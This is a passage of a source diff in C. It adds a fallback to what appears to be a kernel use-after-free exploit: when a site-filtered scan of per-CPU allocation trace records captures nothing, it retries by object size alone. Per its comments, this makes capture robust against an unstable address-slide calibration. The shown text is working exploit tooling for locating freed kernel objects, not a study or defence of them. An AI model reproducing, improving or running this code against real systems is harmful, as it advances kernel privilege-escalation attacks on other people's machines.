@@ -644,6 +644,36 @@ static int collect_nth(int index, int *count, uint64_t *chosen)
 			drain_cpu_raw(cpu, &s, deadline, UAF_RAW_IDLE_MS);
 	}
 
+	/*
+	 * Fallback: if the site-filtered scan captured 0 records (e.g. calib_a
+	 * produced a wrong slide, so SITE_KITIMER_RT points to a call_site that
+	 * does not appear in the trace), retry with filter_by_site=0 (match by
+	 * req size only).  The trace is already armed and the records with the
+	 * correct bytes_req are present — only the call_site needle is wrong.
+	 * This makes UAF capture robust against calib_a slide instability.
+	 */
+	if (s.out_n == 0 && filter_by_site) {
+		dprintf(STDOUT_FILENO,
+			"[uaf] site-filtered scan got 0 hits (site=%#" PRIx64
+			"), retrying without site filter\n",
+			site);
+		rawscan_init(&s, NULL, 0, KITIMER_SIZE,
+			     g_all, (int)(sizeof(g_all) / sizeof(g_all[0])), index);
+		deadline = now_ms_uaf() + UAF_RAW_FIRST_MS;
+		drain_cpu_raw(0, &s, deadline, UAF_RAW_FIRST_MS);
+		if (s.out_n <= index) {
+			ncpu = cpu_count();
+			if (ncpu > UAF_RAW_MAXCPU)
+				ncpu = UAF_RAW_MAXCPU;
+			deadline = now_ms_uaf() + UAF_RAW_FALLBACK_MS;
+			for (cpu = 1; cpu < ncpu; cpu++)
+				drain_cpu_raw(cpu, &s, deadline, UAF_RAW_IDLE_MS);
+		}
+		dprintf(STDOUT_FILENO,
+			"[uaf] fallback (no site filter) captured=%d raw=%zu\n",
+			s.out_n, s.bytes);
+	}
+
 	*count = s.out_n;
 	/*
 	 * g_all[] 只有 out_cap 个槽位，旧实现却把**命中总数**直接写进 g_all_n，
